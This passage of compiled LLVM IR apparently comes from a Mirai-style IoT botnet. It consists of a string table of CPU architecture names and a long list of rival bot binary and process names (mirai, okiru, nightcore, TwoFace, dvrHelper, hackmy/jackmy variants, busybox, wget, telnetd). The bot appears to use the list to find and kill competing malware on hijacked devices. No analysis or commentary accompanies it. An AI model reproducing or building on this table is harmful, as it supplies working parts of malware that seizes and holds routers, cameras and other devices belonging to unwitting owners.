i8]* @.str.390, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.391, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.392, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.393, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.394, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.395, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.396, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.397, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.398, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.399, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.400, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.401, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.402, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.403, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.372, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.404, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.405, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.406, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.407, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.408, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.409, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.410, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.411, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.412, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.413, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.414, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.415, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.416, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.417, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.418, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.419, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.420, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.421, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.422, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.423, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.424, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.425, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.426, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.427, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.428, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.429, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.430, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.431, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.432, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.433, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.434, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.435, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.436, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.437, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.438, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.439, i32 0, i32 0)], align 16
@.str.91 = private unnamed_addr constant [5 x i8] c"mips\00", align 1
@.str.92 = private unnamed_addr constant [7 x i8] c"mips64\00", align 1
@.str.93 = private unnamed_addr constant [7 x i8] c"mipsel\00", align 1
@.str.94 = private unnamed_addr constant [6 x i8] c"sh2eb\00", align 1
@.str.95 = private unnamed_addr constant [7 x i8] c"sh2elf\00", align 1
@.str.96 = private unnamed_addr constant [4 x i8] c"sh4\00", align 1
@.str.97 = private unnamed_addr constant [4 x i8] c"x86\00", align 1
@.str.98 = private unnamed_addr constant [4 x i8] c"arm\00", align 1
@.str.99 = private unnamed_addr constant [6 x i8] c"armv5\00", align 1
@.str.100 = private unnamed_addr constant [8 x i8] c"armv4tl\00", align 1
@.str.101 = private unnamed_addr constant [6 x i8] c"armv4\00", align 1
@.str.102 = private unnamed_addr constant [6 x i8] c"armv6\00", align 1
@.str.103 = private unnamed_addr constant [5 x i8] c"i686\00", align 1
@.str.104 = private unnamed_addr constant [8 x i8] c"powerpc\00", align 1
@.str.105 = private unnamed_addr constant [13 x i8] c"powerpc440fp\00", align 1
@.str.106 = private unnamed_addr constant [5 x i8] c"i586\00", align 1
@.str.107 = private unnamed_addr constant [5 x i8] c"m68k\00", align 1
@.str.108 = private unnamed_addr constant [6 x i8] c"sparc\00", align 1
@.str = private unnamed_addr constant [7 x i8] c"x86_64\00", align 1
@.str.109 = private unnamed_addr constant [7 x i8] c"earyzq\00", align 1
@.str.110 = private unnamed_addr constant [7 x i8] c"cemtop\00", align 1
@.str.111 = private unnamed_addr constant [7 x i8] c"vtyhat\00", align 1
@.str.112 = private unnamed_addr constant [7 x i8] c"vvglma\00", align 1
@.str.113 = private unnamed_addr constant [7 x i8] c"nvitpj\00", align 1
@.str.114 = private unnamed_addr constant [7 x i8] c"razdzn\00", align 1
@.str.115 = private unnamed_addr constant [7 x i8] c"lnkfmx\00", align 1
@.str.116 = private unnamed_addr constant [7 x i8] c"qvmxvl\00", align 1
@.str.117 = private unnamed_addr constant [7 x i8] c"ajoomk\00", align 1
@.str.118 = private unnamed_addr constant [7 x i8] c"fwdfvf\00", align 1
@.str.119 = private unnamed_addr constant [7 x i8] c"atxhua\00", align 1
@.str.120 = private unnamed_addr constant [7 x i8] c"qtmzbn\00", align 1
@.str.121 = private unnamed_addr constant [7 x i8] c"adcvds\00", align 1
@.str.122 = private unnamed_addr constant [10 x i8] c"amsjkfbns\00", align 1
@.str.123 = private unnamed_addr constant [9 x i8] c"xdf.mips\00", align 1
@.str.124 = private unnamed_addr constant [6 x i8] c"xdf.*\00", align 1
@.str.125 = private unnamed_addr constant [5 x i8] c"xdf*\00", align 1
@.str.126 = private unnamed_addr constant [11 x i8] c"xdf.mipsel\00", align 1
@.str.127 = private unnamed_addr constant [11 x i8] c"xdf.x86_64\00", align 1
@.str.128 = private unnamed_addr constant [9 x i8] c"xdf.arm7\00", align 1
@.str.129 = private unnamed_addr constant [8 x i8] c"xdf.ppc\00", align 1
@.str.130 = private unnamed_addr constant [16 x i8] c"hex**hexxdf.sh4\00", align 1
@.str.131 = private unnamed_addr constant [4 x i8] c"ppc\00", align 1
@.str.132 = private unnamed_addr constant [6 x i8] c"jack*\00", align 1
@.str.133 = private unnamed_addr constant [6 x i8] c"hack*\00", align 1
@.str.134 = private unnamed_addr constant [11 x i8] c"arm*tel*b1\00", align 1
@.str.135 = private unnamed_addr constant [3 x i8] c"b2\00", align 1
@.str.136 = private unnamed_addr constant [3 x i8] c"b3\00", align 1
@.str.137 = private unnamed_addr constant [3 x i8] c"b4\00", align 1
@.str.138 = private unnamed_addr constant [3 x i8] c"b5\00", align 1
@.str.139 = private unnamed_addr constant [3 x i8] c"b6\00", align 1
@.str.140 = private unnamed_addr constant [3 x i8] c"b7\00", align 1
@.str.141 = private unnamed_addr constant [3 x i8] c"b8\00", align 1
@.str.142 = private unnamed_addr constant [3 x i8] c"b9\00", align 1
@.str.143 = private unnamed_addr constant [5 x i8] c"wget\00", align 1
@.str.144 = private unnamed_addr constant [6 x i8] c"orion\00", align 1
@.str.145 = private unnamed_addr constant [5 x i8] c"lol*\00", align 1
@.str.146 = private unnamed_addr constant [9 x i8] c"busybox*\00", align 1
@.str.147 = private unnamed_addr constant [8 x i8] c"badbox*\00", align 1
@.str.148 = private unnamed_addr constant [9 x i8] c"DFhxdhdf\00", align 1
@.str.149 = private unnamed_addr constant [10 x i8] c"dvrHelper\00", align 1
@.str.150 = private unnamed_addr constant [8 x i8] c"FDFDHFC\00", align 1
@.str.151 = private unnamed_addr constant [5 x i8] c"FEUB\00", align 1
@.str.152 = private unnamed_addr constant [9 x i8] c"FTUdftui\00", align 1
@.str.153 = private unnamed_addr constant [9 x i8] c"GHfjfgvj\00", align 1
@.str.154 = private unnamed_addr constant [6 x i8] c"jhUOH\00", align 1
@.str.155 = private unnamed_addr constant [9 x i8] c"JIPJIPJj\00", align 1
@.str.156 = private unnamed_addr constant [10 x i8] c"JIPJuipjh\00", align 1
@.str.157 = private unnamed_addr constant [10 x i8] c"kmyx86_64\00", align 1
@.str.158 = private unnamed_addr constant [10 x i8] c"lolmipsel\00", align 1
@.str.159 = private unnamed_addr constant [8 x i8] c"RYrydry\00", align 1
@.str.160 = private unnamed_addr constant [9 x i8] c"TwoFace*\00", align 1
@.str.161 = private unnamed_addr constant [9 x i8] c"UYyuyioy\00", align 1
@.str.162 = private unnamed_addr constant [9 x i8] c"XDzdfxzf\00", align 1
@.str.163 = private unnamed_addr constant [4 x i8] c"xx*\00", align 1
@.str.164 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.165 = private unnamed_addr constant [2 x i8] c"1\00", align 1
@.str.166 = private unnamed_addr constant [2 x i8] c"2\00", align 1
@.str.167 = private unnamed_addr constant [2 x i8] c"3\00", align 1
@.str.168 = private unnamed_addr constant [2 x i8] c"4\00", align 1
@.str.169 = private unnamed_addr constant [2 x i8] c"5\00", align 1
@.str.170 = private unnamed_addr constant [2 x i8] c"6\00", align 1
@.str.171 = private unnamed_addr constant [2 x i8] c"7\00", align 1
@.str.172 = private unnamed_addr constant [2 x i8] c"8\00", align 1
@.str.173 = private unnamed_addr constant [2 x i8] c"9\00", align 1
@.str.174 = private unnamed_addr constant [3 x i8] c"10\00", align 1
@.str.175 = private unnamed_addr constant [3 x i8] c"11\00", align 1
@.str.176 = private unnamed_addr constant [3 x i8] c"12\00", align 1
@.str.177 = private unnamed_addr constant [3 x i8] c"13\00", align 1
@.str.178 = private unnamed_addr constant [7 x i8] c"owari*\00", align 1
@.str.179 = private unnamed_addr constant [3 x i8] c"14\00", align 1
@.str.180 = private unnamed_addr constant [3 x i8] c"15\00", align 1
@.str.181 = private unnamed_addr constant [3 x i8] c"16\00", align 1
@.str.182 = private unnamed_addr constant [3 x i8] c"17\00", align 1
@.str.183 = private unnamed_addr constant [3 x i8] c"18\00", align 1
@.str.184 = private unnamed_addr constant [3 x i8] c"19\00", align 1
@.str.185 = private unnamed_addr constant [3 x i8] c"20\00", align 1
@.str.186 = private unnamed_addr constant [8 x i8] c"busybox\00", align 1
@.str.187 = private unnamed_addr constant [7 x i8] c"badbox\00", align 1
@.str.188 = private unnamed_addr constant [7 x i8] c"Mirai*\00", align 1
@.str.189 = private unnamed_addr constant [11 x i8] c"cunty*IoT*\00", align 1
@.str.190 = private unnamed_addr constant [11 x i8] c"jackmymips\00", align 1
@.str.191 = private unnamed_addr constant [13 x i8] c"jackmymips64\00", align 1
@.str.192 = private unnamed_addr constant [13 x i8] c"jackmymipsel\00", align 1
@.str.193 = private unnamed_addr constant [12 x i8] c"jackmysh2eb\00", align 1
@.str.194 = private unnamed_addr constant [13 x i8] c"jackmysh2elf\00", align 1
@.str.195 = private unnamed_addr constant [10 x i8] c"jackmysh4\00", align 1
@.str.196 = private unnamed_addr constant [10 x i8] c"jackmyx86\00", align 1
@.str.197 = private unnamed_addr constant [12 x i8] c"jackmyarmv5\00", align 1
@.str.198 = private unnamed_addr constant [14 x i8] c"jackmyarmv4tl\00", align 1
@.str.199 = private unnamed_addr constant [12 x i8] c"jackmyarmv4\00", align 1
@.str.200 = private unnamed_addr constant [12 x i8] c"jackmyarmv6\00", align 1
@.str.201 = private unnamed_addr constant [11 x i8] c"jackmyi686\00", align 1
@.str.202 = private unnamed_addr constant [14 x i8] c"jackmypowerpc\00", align 1
@.str.203 = private unnamed_addr constant [19 x i8] c"jackmypowerpc440fp\00", align 1
@.str.204 = private unnamed_addr constant [11 x i8] c"jackmyi586\00", align 1
@.str.205 = private unnamed_addr constant [11 x i8] c"jackmym68k\00", align 1
@.str.206 = private unnamed_addr constant [12 x i8] c"jackmysparc\00", align 1
@.str.207 = private unnamed_addr constant [13 x i8] c"jackmyx86_64\00", align 1
@.str.208 = private unnamed_addr constant [11 x i8] c"hackmymips\00", align 1
@.str.209 = private unnamed_addr constant [13 x i8] c"hackmymips64\00", align 1
@.str.210 = private unnamed_addr constant [13 x i8] c"hackmymipsel\00", align 1
@.str.211 = private unnamed_addr constant [12 x i8] c"hackmysh2eb\00", align 1
@.str.212 = private unnamed_addr constant [13 x i8] c"hackmysh2elf\00", align 1
@.str.213 = private unnamed_addr constant [10 x i8] c"hackmysh4\00", align 1
@.str.214 = private unnamed_addr constant [10 x i8] c"hackmyx86\00", align 1
@.str.215 = private unnamed_addr constant [12 x i8] c"hackmyarmv5\00", align 1
@.str.216 = private unnamed_addr constant [14 x i8] c"hackmyarmv4tl\00", align 1
@.str.217 = private unnamed_addr constant [12 x i8] c"hackmyarmv4\00", align 1
@.str.218 = private unnamed_addr constant [12 x i8] c"hackmyarmv6\00", align 1
@.str.219 = private unnamed_addr constant [11 x i8] c"hackmyi686\00", align 1
@.str.220 = private unnamed_addr constant [14 x i8] c"hackmypowerpc\00", align 1
@.str.221 = private unnamed_addr constant [19 x i8] c"hackmypowerpc440fp\00", align 1
@.str.222 = private unnamed_addr constant [11 x i8] c"hackmyi586\00", align 1
@.str.223 = private unnamed_addr constant [11 x i8] c"hackmym68k\00", align 1
@.str.224 = private unnamed_addr constant [12 x i8] c"hackmysparc\00", align 1
@.str.225 = private unnamed_addr constant [13 x i8] c"hackmyx86_64\00", align 1
@.str.226 = private unnamed_addr constant [4 x i8] c"b10\00", align 1
@.str.227 = private unnamed_addr constant [4 x i8] c"b11\00", align 1
@.str.228 = private unnamed_addr constant [4 x i8] c"b12\00", align 1
@.str.229 = private unnamed_addr constant [4 x i8] c"b13\00", align 1
@.str.230 = private unnamed_addr constant [4 x i8] c"b14\00", align 1
@.str.231 = private unnamed_addr constant [4 x i8] c"b15\00", align 1
@.str.232 = private unnamed_addr constant [4 x i8] c"b16\00", align 1
@.str.233 = private unnamed_addr constant [4 x i8] c"b17\00", align 1
@.str.234 = private unnamed_addr constant [4 x i8] c"b18\00", align 1
@.str.235 = private unnamed_addr constant [4 x i8] c"b19\00", align 1
@.str.236 = private unnamed_addr constant [4 x i8] c"b20\00", align 1
@.str.237 = private unnamed_addr constant [17 x i8] c"busyboxterrorist\00", align 1
@.str.238 = private unnamed_addr constant [8 x i8] c"kmymips\00", align 1
@.str.239 = private unnamed_addr constant [10 x i8] c"kmymips64\00", align 1
@.str.240 = private unnamed_addr constant [10 x i8] c"kmymipsel\00", align 1
@.str.241 = private unnamed_addr constant [9 x i8] c"kmysh2eb\00", align 1
@.str.242 = private unnamed_addr constant [10 x i8] c"kmysh2elf\00", align 1
@.str.243 = private unnamed_addr constant [7 x i8] c"kmysh4\00", align 1
@.str.244 = private unnamed_addr constant [7 x i8] c"kmyx86\00", align 1
@.str.245 = private unnamed_addr constant [9 x i8] c"kmyarmv5\00", align 1
@.str.246 = private unnamed_addr constant [11 x i8] c"kmyarmv4tl\00", align 1
@.str.247 = private unnamed_addr constant [9 x i8] c"kmyarmv4\00", align 1
@.str.248 = private unnamed_addr constant [9 x i8] c"kmyarmv6\00", align 1
@.str.249 = private unnamed_addr constant [11 x i8] c"botkillme*\00", align 1
@.str.250 = private unnamed_addr constant [8 x i8] c"kmyi686\00", align 1
@.str.251 = private unnamed_addr constant [11 x i8] c"kmypowerpc\00", align 1
@.str.252 = private unnamed_addr constant [16 x i8] c"kmypowerpc440fp\00", align 1
@.str.253 = private unnamed_addr constant [8 x i8] c"kmyi586\00", align 1
@.str.254 = private unnamed_addr constant [8 x i8] c"kmym68k\00", align 1
@.str.255 = private unnamed_addr constant [9 x i8] c"kmysparc\00", align 1
@.str.256 = private unnamed_addr constant [8 x i8] c"lolmips\00", align 1
@.str.257 = private unnamed_addr constant [10 x i8] c"lolmips64\00", align 1
@.str.258 = private unnamed_addr constant [9 x i8] c"lolsh2eb\00", align 1
@.str.259 = private unnamed_addr constant [10 x i8] c"lolsh2elf\00", align 1
@.str.260 = private unnamed_addr constant [7 x i8] c"lolsh4\00", align 1
@.str.261 = private unnamed_addr constant [7 x i8] c"lolx86\00", align 1
@.str.262 = private unnamed_addr constant [9 x i8] c"lolarmv5\00", align 1
@.str.263 = private unnamed_addr constant [11 x i8] c"lolarmv4tl\00", align 1
@.str.264 = private unnamed_addr constant [9 x i8] c"lolarmv4\00", align 1
@.str.265 = private unnamed_addr constant [9 x i8] c"lolarmv6\00", align 1
@.str.266 = private unnamed_addr constant [8 x i8] c"loli686\00", align 1
@.str.267 = private unnamed_addr constant [12 x i8] c"mirai.linux\00", align 1
@.str.268 = private unnamed_addr constant [11 x i8] c"mirai.mips\00", align 1
@.str.269 = private unnamed_addr constant [11 x i8] c"lolpowerpc\00", align 1
@.str.270 = private unnamed_addr constant [16 x i8] c"lolpowerpc440fp\00", align 1
@.str.271 = private unnamed_addr constant [8 x i8] c"loli586\00", align 1
@.str.272 = private unnamed_addr constant [8 x i8] c"lolm68k\00", align 1
@.str.273 = private unnamed_addr constant [9 x i8] c"lolsparc\00", align 1
@.str.274 = private unnamed_addr constant [8 x i8] c"telmips\00", align 1
@.str.275 = private unnamed_addr constant [10 x i8] c"telmips64\00", align 1
@.str.276 = private unnamed_addr constant [10 x i8] c"telmipsel\00", align 1
@.str.277 = private unnamed_addr constant [9 x i8] c"telsh2eb\00", align 1
@.str.278 = private unnamed_addr constant [10 x i8] c"telsh2elf\00", align 1
@.str.279 = private unnamed_addr constant [7 x i8] c"telsh4\00", align 1
@.str.280 = private unnamed_addr constant [7 x i8] c"telx86\00", align 1
@.str.281 = private unnamed_addr constant [9 x i8] c"telarmv5\00", align 1
@.str.282 = private unnamed_addr constant [11 x i8] c"telarmv4tl\00", align 1
@.str.283 = private unnamed_addr constant [9 x i8] c"telarmv4\00", align 1
@.str.284 = private unnamed_addr constant [9 x i8] c"telarmv6\00", align 1
@.str.285 = private unnamed_addr constant [8 x i8] c"teli686\00", align 1
@.str.286 = private unnamed_addr constant [11 x i8] c"telpowerpc\00", align 1
@.str.287 = private unnamed_addr constant [16 x i8] c"telpowerpc440fp\00", align 1
@.str.288 = private unnamed_addr constant [8 x i8] c"teli586\00", align 1
@.str.289 = private unnamed_addr constant [8 x i8] c"telm68k\00", align 1
@.str.290 = private unnamed_addr constant [9 x i8] c"telsparc\00", align 1
@.str.291 = private unnamed_addr constant [10 x i8] c"telx86_64\00", align 1
@.str.292 = private unnamed_addr constant [12 x i8] c"TwoFacemips\00", align 1
@.str.293 = private unnamed_addr constant [14 x i8] c"TwoFacemips64\00", align 1
@.str.294 = private unnamed_addr constant [14 x i8] c"TwoFacemipsel\00", align 1
@.str.295 = private unnamed_addr constant [13 x i8] c"TwoFacesh2eb\00", align 1
@.str.296 = private unnamed_addr constant [14 x i8] c"TwoFacesh2elf\00", align 1
@.str.297 = private unnamed_addr constant [11 x i8] c"TwoFacesh4\00", align 1
@.str.298 = private unnamed_addr constant [11 x i8] c"TwoFacex86\00", align 1
@.str.299 = private unnamed_addr constant [13 x i8] c"TwoFacearmv5\00", align 1
@.str.300 = private unnamed_addr constant [15 x i8] c"TwoFacearmv4tl\00", align 1
@.str.301 = private unnamed_addr constant [13 x i8] c"TwoFacearmv4\00", align 1
@.str.302 = private unnamed_addr constant [13 x i8] c"TwoFacearmv6\00", align 1
@.str.303 = private unnamed_addr constant [12 x i8] c"TwoFacei686\00", align 1
@.str.304 = private unnamed_addr constant [15 x i8] c"TwoFacepowerpc\00", align 1
@.str.305 = private unnamed_addr constant [20 x i8] c"TwoFacepowerpc440fp\00", align 1
@.str.306 = private unnamed_addr constant [12 x i8] c"TwoFacei586\00", align 1
@.str.307 = private unnamed_addr constant [12 x i8] c"TwoFacem68k\00", align 1
@.str.308 = private unnamed_addr constant [13 x i8] c"TwoFacesparc\00", align 1
@.str.309 = private unnamed_addr constant [14 x i8] c"TwoFacex86_64\00", align 1
@.str.310 = private unnamed_addr constant [5 x i8] c"xxb1\00", align 1
@.str.311 = private unnamed_addr constant [5 x i8] c"xxb2\00", align 1
@.str.312 = private unnamed_addr constant [5 x i8] c"xxb3\00", align 1
@.str.313 = private unnamed_addr constant [5 x i8] c"xxb4\00", align 1
@.str.314 = private unnamed_addr constant [5 x i8] c"xxb5\00", align 1
@.str.315 = private unnamed_addr constant [5 x i8] c"xxb6\00", align 1
@.str.316 = private unnamed_addr constant [5 x i8] c"xxb7\00", align 1
@.str.317 = private unnamed_addr constant [5 x i8] c"xxb8\00", align 1
@.str.318 = private unnamed_addr constant [5 x i8] c"xxb9\00", align 1
@.str.319 = private unnamed_addr constant [6 x i8] c"xxb10\00", align 1
@.str.320 = private unnamed_addr constant [6 x i8] c"xxb11\00", align 1
@.str.321 = private unnamed_addr constant [6 x i8] c"xxb12\00", align 1
@.str.322 = private unnamed_addr constant [6 x i8] c"xxb13\00", align 1
@.str.323 = private unnamed_addr constant [6 x i8] c"xxb14\00", align 1
@.str.324 = private unnamed_addr constant [6 x i8] c"xxb15\00", align 1
@.str.325 = private unnamed_addr constant [6 x i8] c"xxb16\00", align 1
@.str.326 = private unnamed_addr constant [6 x i8] c"xxb17\00", align 1
@.str.327 = private unnamed_addr constant [6 x i8] c"xxb18\00", align 1
@.str.328 = private unnamed_addr constant [6 x i8] c"xxb19\00", align 1
@.str.329 = private unnamed_addr constant [6 x i8] c"xxb20\00", align 1
@.str.330 = private unnamed_addr constant [3 x i8] c"bb\00", align 1
@.str.331 = private unnamed_addr constant [11 x i8] c"busybotnet\00", align 1
@.str.332 = private unnamed_addr constant [5 x i8] c"pppd\00", align 1
@.str.333 = private unnamed_addr constant [6 x i8] c"pppoe\00", align 1
@.str.334 = private unnamed_addr constant [5 x i8] c"wput\00", align 1
@.str.335 = private unnamed_addr constant [4 x i8] c"DVR\00", align 1
@.str.336 = private unnamed_addr constant [7 x i8] c"*mirai\00", align 1
@.str.337 = private unnamed_addr constant [8 x i8] c"*.mirai\00", align 1
@.str.338 = private unnamed_addr constant [7 x i8] c"cunty*\00", align 1
@.str.339 = private unnamed_addr constant [3 x i8] c"pc\00", align 1
@.str.340 = private unnamed_addr constant [11 x i8] c"orion.mips\00", align 1
@.str.341 = private unnamed_addr constant [11 x i8] c"okiru.mips\00", align 1
@.str.342 = private unnamed_addr constant [15 x i8] c"nightcore.mips\00", align 1
@.str.343 = private unnamed_addr constant [3 x i8] c"ar\00", align 1
@.str.344 = private unnamed_addr constant [9 x i8] c"lsp.modz\00", align 1
@.str.345 = private unnamed_addr constant [11 x i8] c"nightcore*\00", align 1
@.str.346 = private unnamed_addr constant [6 x i8] c"netis\00", align 1
@.str.347 = private unnamed_addr constant [7 x i8] c"mipsxd\00", align 1
@.str.348 = private unnamed_addr constant [9 x i8] c"die.mips\00", align 1
@.str.349 = private unnamed_addr constant [13 x i8] c"dupessh*mips\00", align 1
@.str.350 = private unnamed_addr constant [7 x i8] c"linux*\00", align 1
@.str.351 = private unnamed_addr constant [7 x i8] c"mirai*\00", align 1
@.str.352 = private unnamed_addr constant [7 x i8] c"*.mips\00", align 1
@.str.353 = private unnamed_addr constant [4 x i8] c"pps\00", align 1
@.str.354 = private unnamed_addr constant [5 x i8] c"sh4*\00", align 1
@.str.355 = private unnamed_addr constant [6 x i8] c"wget*\00", align 1
@.str.356 = private unnamed_addr constant [5 x i8] c"ssh*\00", align 1
@.str.357 = private unnamed_addr constant [7 x i8] c"vulcan\00", align 1
@.str.358 = private unnamed_addr constant [10 x i8] c"jennifer*\00", align 1
@.str.359 = private unnamed_addr constant [7 x i8] c"okiru*\00", align 1
@.str.360 = private unnamed_addr constant [8 x i8] c"vulcana\00", align 1
@.str.361 = private unnamed_addr constant [8 x i8] c"vulcanb\00", align 1
@.str.362 = private unnamed_addr constant [8 x i8] c"vulcand\00", align 1
@.str.363 = private unnamed_addr constant [8 x i8] c"vulcane\00", align 1
@.str.364 = private unnamed_addr constant [8 x i8] c"vulcanx\00", align 1
@.str.365 = private unnamed_addr constant [8 x i8] c"vulcany\00", align 1
@.str.366 = private unnamed_addr constant [8 x i8] c"vulcanz\00", align 1
@.str.367 = private unnamed_addr constant [8 x i8] c"vulcang\00", align 1
@.str.368 = private unnamed_addr constant [8 x i8] c"vulcan*\00", align 1
@.str.369 = private unnamed_addr constant [8 x i8] c"apache2\00", align 1
@.str.370 = private unnamed_addr constant [8 x i8] c"telnetd\00", align 1
@.str.371 = private unnamed_addr constant [7 x i8] c"gaybot\00", align 1
@.str.372 = private unnamed_addr constant [8 x i8] c"qghiqgd\00", align 1
@.str.373 = private unnamed_addr constant [8 x i8] c"cdnnqkk\00", align 1
@.str.374 = private unnamed_addr constant [8 x i8] c"uhnvepy\00", align 1
@.str.375 = private unnamed_addr constant [8 x i8] c"zrzyqyc\00", align 1
@.str.376 = private unnamed_addr constant [8 x i8] c"zvkghct\00", align 1
@.str.377 = private unnamed_addr constant [8 x i8] c"mykzydo\00", align 1
@.str.378 = private unnamed_addr constant [8 x i8] c"yyfizcz\00", align 1
@.str.379 = private unnamed_addr constant [8 x i8] c"zjevbar\00", align 1
@.str.380 = private unnamed_addr constant [8 x i8] c"lowssdj\00", align 1
@.str.381 = private unnamed_addr constant [8 x i8] c"aexpcjr\00", align 1
@.str.382 = private unnamed_addr constant [8 x i8] c"qssyevb\00", align 1
@.str.383 = private unnamed_addr constant [8 x i8] c"gcjiyol\00", align 1
@.str.384 = private unnamed_addr constant [8 x i8] c"inlxqjm\00", align 1
@.str.385 = private unnamed_addr constant [8 x i8] c"swgypcx\00", align 1
@.str.386 = private unnamed_addr constant [8 x i8] c"whsilop\00", align 1
@.str.387 = private unnamed_addr constant [8 x i8] c"ezmjymp\00", align 1
@.str.388 = private unnamed_addr constant [8 x i8] c"huscmww\00", align 1
@.str.389 = private unnamed_addr constant [8 x i8] c"pbhcocg\00", align 1
@.str.390 = private unnamed_addr constant [4 x i8] c"unk\00", align 1
@.str.391 = private unnamed_addr constant [5 x i8] c"unk*\00", align 1
@.str.392 = private unnamed_addr constant [5 x i8] c"unk1\00", align 1
@.str.393 = private unnamed_addr constant [5 x i8] c"unk2\00", align 1
@.str.394 = private unnamed_addr constant [5 x i8] c"unk3\00", align 1
@.str.395 = private unnamed_addr constant [5 x i8] c"unk4\00", align 1
@.str.396 = private unnamed_addr constant [7 x i8] c"smbvar\00", align 1
@.str.397 = private unnamed_addr constant [5 x i8] c"cert\00", align 1
@.str.398 = private unnamed_addr constant [10 x i8] c"neoisgay1\00", align 1
@.str.399 = private unnamed_addr constant [6 x i8] c"migg*\00", align 1
@.str.400 = private unnamed_addr constant [6 x i8] c"*ntpd\00", align 1
@.str.401 = private unnamed_addr constant [6 x i8] c"*sshd\00", align 1
@.str.402 = private unnamed_addr constant [10 x i8] c"miggsntpd\00", align 1
@.str.403 = private unnamed_addr constant [10 x i8] c"miggssshd\00", align 1
@.str.404 = private unnamed_addr constant [8 x i8] c"glbkjrn\00", align 1
@.str.405 = private unnamed_addr constant [8 x i8] c"vlbebuw\00", align 1
@.str.406 = private unnamed_addr constant [8 x i8] c"vqvdszx\00", align 1
@.str.407 = private unnamed_addr constant [8 x i8] c"ybahlvc\00", align 1
@.str.408 = private unnamed_addr constant [8 x i8] c"ttyuceq\00", align 1
@.str.409 = private unnamed_addr constant [8 x i8] c"keansia\00", align 1
@.str.410 = private unnamed_addr constant [8 x i8] c"scplnrh\00", align 1
@.str.411 = private unnamed_addr constant [8 x i8] c"eyqpmcb\00", align 1
@.str.412 = private unnamed_addr constant [8 x i8] c"thwbaja\00", align 1
@.str.413 = private unnamed_addr constant [8 x i8] c"ugenuge\00", align 1
@.str.414 = private unnamed_addr constant [8 x i8] c"pfdbupp\00", align 1
@.str.415 = private unnamed_addr constant [8 x i8] c"djnkpip\00", align 1
@.str.416 = private unnamed_addr constant [8 x i8] c"xvurmuo\00", align 1
@.str.417 = private unnamed_addr constant [8 x i8] c"xzywnsq\00", align 1
@.str.418 = private unnamed_addr constant [8 x i8] c"lztuvaq\00", align 1
@.str.419 = private unnamed_addr constant [8 x i8] c"pducsnb\00", align 1
@.str.420 = private unnamed_addr constant [8 x i8] c"adgjedp\00", align 1
@.str.421 = private unnamed_addr constant [8 x i8] c"khnklhx\00", align 1
@.str.422 = private unnamed_addr constant [7 x i8] c"svjqtj\00", align 1
@.str.423 = private unnamed_addr constant [7 x i8] c"yolwdx\00", align 1
@.str.424 = private unnamed_addr constant [7 x i8] c"aveckh\00", align 1
@.str.425 = private unnamed_addr constant [7 x i8] c"mltnkv\00", align 1
